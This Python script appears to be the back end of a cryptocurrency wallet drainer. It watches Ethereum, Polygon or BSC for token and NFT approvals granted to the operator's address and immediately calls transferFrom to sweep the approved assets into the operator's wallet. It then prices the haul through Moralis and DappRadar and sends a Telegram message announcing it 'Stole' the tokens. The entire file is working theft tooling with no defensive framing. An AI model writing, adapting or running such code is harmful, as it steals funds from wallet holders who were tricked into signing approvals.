from websocket import create_connection, WebSocketConnectionClosedException
import json
import asyncio
from web3 import Web3
import threading
import logging
import logging
import sys
from time import sleep
import traceback
import requests
import cfscrape
import ssl

INFURA_WS = ""
INFURA_HTTP = ""
PRIVATE_KEY = ""
INFURA_HTTP = ""
MORALIS_KEY = ""
LOG_LANGUAGE = ""
SCAN = ""
CHAIN_ID = 0
CHAIN_NAME = ""
TG_BOT_TOKEN = ""
TG_CHAT_ID = ""

CHAIN_ID_MATCH = {
    "ethereum": 1,
    "matic": 137,
    "bsc":56
}
OPENSEA_MATCH = {
    "ethereum": "ethereum",
    "matic": "matic"
}
MORALIS_MATCH = {
    "ethereum": "eth",
    "matic": "polygon",
    "bsc": "bsc"
}
RADAR_MATCH = {
    "ethereum": "ethereum",
    "matic": "polygon",
    "bsc": "bsc"
}

NFT_HASH = "0x095ea7b3"
TOKEN_HASH = "0x095ea7b3"


ABI = {}



FORMAT_SCHEMA = "%(asctime)s | %(message)s"

logger = logging.getLogger("TokenTransfer")
logger.setLevel(logging.INFO)
formatter = logging.Formatter(FORMAT_SCHEMA)
stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setFormatter(formatter)
file_handler = logging.FileHandler("logs.txt")
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)
logger.addHandler(stream_handler)
    
approves = list()
tx_hashes = set()

def notify(is_nft, tx_id, contract_address, amount, price):
    url = "https://api.telegram.org/bot{}/sendMessage?chat_id={}&parse_mode=markdown&text={}"
    scan_str = SCAN+"tx/"+str(tx_id)+"\n"
    opensea_str = f"├ [OpenSea](https://opensea.io/assets/{OPENSEA_MATCH[CHAIN_NAME]}/{contract_address}/{amount})\n" if is_nft else ""
    price_str = ""
    type_str = ""
    msg = ""
    if LOG_LANGUAGE == "rus":
        price_str = "На общую сумму {0:.2f}$".format(price) if price>0 else ""
        type_str = "NFT" if is_nft else "токены"
        msg = "Списал"
    else:
        price_str = "Total cost {0:.2f}$".format(price) if price>0 else ""
        type_str = "NFT" if is_nft else "tokens"
        msg="Stole"
    
    text = f"🤑 {msg} {type_str}\n {opensea_str} └ [Scan]({scan_str})\n {price_str}"

    
    response = requests.get(url.format(TG_BOT_TOKEN, TG_CHAT_ID, text))

    if response.status_code != 200:
        return False
    
    return True


def get_token_info(address, sender_address,  is_nft, amount):
    
    try:
        price = 0
        if is_nft:

            scraper = cfscrape.create_scraper()
            response = scraper.get(f"https://dappradar.com/apiv3/nft/items/{sender_address}?version=2&protocol={RADAR_MATCH[CHAIN_NAME]}&offset=0&limit=15&sortBy=mainPrice&order=desc&fiat=USD")
            data = json.loads(response.text)
            token_list = data['data']['nft_items']
            for token in token_list:
                if token["smart_contract_id"] == address:
                    price = token["prices"]["mainPrice"]["value"]
                    
        else:
            response = requests.get(f"https://deep-index.moralis.io/api/v2/erc20/{address}/price?chain={MORALIS_MATCH[CHAIN_NAME]}", headers= {
                "X-API-Key": MORALIS_KEY,
                })
            data = json.loads(response.text)
            price = data['usdPrice'] 
            
        if price == 0:
            raise Exception
        return price*amount
    except Exception as e:
        raise Exception

async def listen_ws(address, w3: Web3):
    while True:
        logger.info("Creating new connection")    
        try:
            ws = create_connection(INFURA_WS, sslopt={"cert_reqs": ssl.CERT_NONE})
            ws.send('{"jsonrpc": "2.0", "id": 1, "method": "eth_subscribe", "params": ["logs", {"topics": ["0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"]}]}')
            connect_msg =  ws.recv()
            logger.info(f"Connected with message: {connect_msg}")
            while True:
                try:
                    message = ws.recv()
                    response = json.loads(message)
                    approveLog = response['params']['result']
            
                    if address[2:] in approveLog['topics'][2] and not approveLog['transactionHash'] in tx_hashes:
                        tx = w3.eth.getTransaction(approveLog['transactionHash'])
                        approves.append(tx)
                        tx_hashes.add(approveLog['transactionHash'])
                
                except IndexError as e:
                    pass
                
                except WebSocketConnectionClosedException as e:
                    logger.info("Socket closed. Reconnecting")
                    break
                except Exception as e:
                    logger.info(f"Erorr ocurred while getting data: {e}")
                    print(traceback.format_exc())
        except Exception as e:
            logger.info(f"Error ocurred while connecting {e}")
            print(traceback.format_exc())
    
def handle_approve(address, w3: Web3):
    while True:
        if len(approves) > 0:
            try: 
                logger.info("Found approve")
                tx = approves.pop()
                token = w3.eth.contract(address=w3.toChecksumAddress(tx.to), abi=ABI)
                decoded_input = token.decode_function_input(tx.input)
                balance = token.functions.balanceOf(w3.toChecksumAddress(tx["from"])).call()
                if min(balance, decoded_input[1]['_value']) == 0:
                    logger.info("Found approve of zero tokens. Skipping...")
                    continue
                nonce = w3.eth.getTransactionCount(w3.toChecksumAddress(address))
                transfer_tx = token.functions.transferFrom(
                    w3.toChecksumAddress(tx["from"]),
                    w3.toChecksumAddress(address),
                    min(balance, decoded_input[1]['_value'])
                ).buildTransaction({
                    'chainId': CHAIN_ID,
                    'gas': 100000,
                    'gasPrice': tx.gasPrice,
                    'nonce': nonce,
                })
                signed_tx = w3.eth.account.signTransaction(transfer_tx, PRIVATE_KEY)
                resp = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
                logger.info(f"Transaction sent. ID: {resp.hex()}")

                is_nft = True
                decimals = 0
                try:
                    try:
                        a = token.functions.ownerOf(decoded_input[1]['_value']).call()  
                    except Exception:
                        is_nft = False
                        decimals = token.functions.decimals().call()
                except Exception as e:
                    print(e)
            
                logger.info("Getting prices")

                price=0
                try:
                    price = get_token_info(tx.to.lower(), tx["from"].lower(), is_nft, 1 if is_nft else (int(min(balance, decoded_input[1]['_value']))/10**decimals))
                except Exception as e:
                    logger.info(f"Getting prices failed with {str(e)}")
                else:
                    logger.info(f"Price of token found succesfully. Total price: {price}")
                    
                logger.info("Sending telegram message")
                res = notify(is_nft, resp.hex(), tx.to, decoded_input[1]['_value'] if is_nft else int(min(balance, decoded_input[1]['_value']))/10**decimals, price)
                if res:
                    logger.info("Sent succesfully")
                else:
                    logger.info("Error occured while sending a message")
            except Exception as e:
                logger.info(e)
        sleep(1.5)
def start_ws_service(account, w3):
    asyncio.new_event_loop().run_until_complete(listen_ws(account, w3))

if __name__ == "__main__":
    config_dict = dict()
    with open("config.json") as f:
        config_dict = json.loads(f.read())
        TG_CHAT_ID = config_dict["tgChatId"]
        TG_BOT_TOKEN = config_dict["tgBotToken"]
        PRIVATE_KEY = config_dict["privateKey"]

        config_dict=config_dict["polygon"]

        INFURA_WS = config_dict["infuraWS"]
        INFURA_HTTP = config_dict["infuraHTTP"]
        MORALIS_KEY = config_dict["moralisKey"]
        CHAIN_NAME = config_dict["chainName"]
        LOG_LANGUAGE = config_dict["logLanguage"]
        SCAN = config_dict["scan"]

    CHAIN_ID = CHAIN_ID_MATCH[CHAIN_NAME]
    with open("ERC_abi.json") as f:
        ABI = json.loads(f.read())
    


    w3 = Web3(Web3.HTTPProvider(INFURA_HTTP, request_kwargs={"timeout": 15}))
    account = w3.eth.account.privateKeyToAccount(PRIVATE_KEY)
  
    logger.info(f"Reciever address: {account.address}")
    logger.info(f"Current config: {config_dict}")
    logger.info(f"Connecting to chain...")

    ws_thread = threading.Thread(target=start_ws_service, args=[account.address.lower(), w3])
    handler_thread = threading.Thread(target=handle_approve, args=[account.address.lower(), w3])
    ws_thread.start()
    handler_thread.start()    
    ws_thread.join()
    handler_thread.join()

    